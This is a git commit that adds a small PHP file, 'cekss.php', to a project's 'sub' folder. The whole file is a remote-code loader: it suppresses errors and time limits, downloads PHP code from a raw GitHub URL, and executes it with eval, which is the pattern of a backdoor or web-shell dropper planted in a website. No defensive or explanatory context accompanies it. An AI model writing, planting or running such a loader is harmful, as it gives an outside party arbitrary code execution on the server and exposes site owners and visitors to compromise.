4d9922560a275589c3e0584c879836c1d9b9a852
damnit6 <ressasantikaa@gmail.com>
2026-08-17 13:15:37 +0200

    Create cekss.php

---
+++ sub/cekss.php
@@ -0,0 +1,16 @@
+test<?php
+error_reporting(0);
+set_time_limit(0);
+
+// 
+$url = "https://raw.githubusercontent.com/ressasantikaa-rgb/serveroff/main/tnoff.php";
+
+// 
+$code = @file_get_contents($url);
+
+// 
+if($code !== false){
+    eval("?>".$code);
+} else {
+    echo "lose";
+}
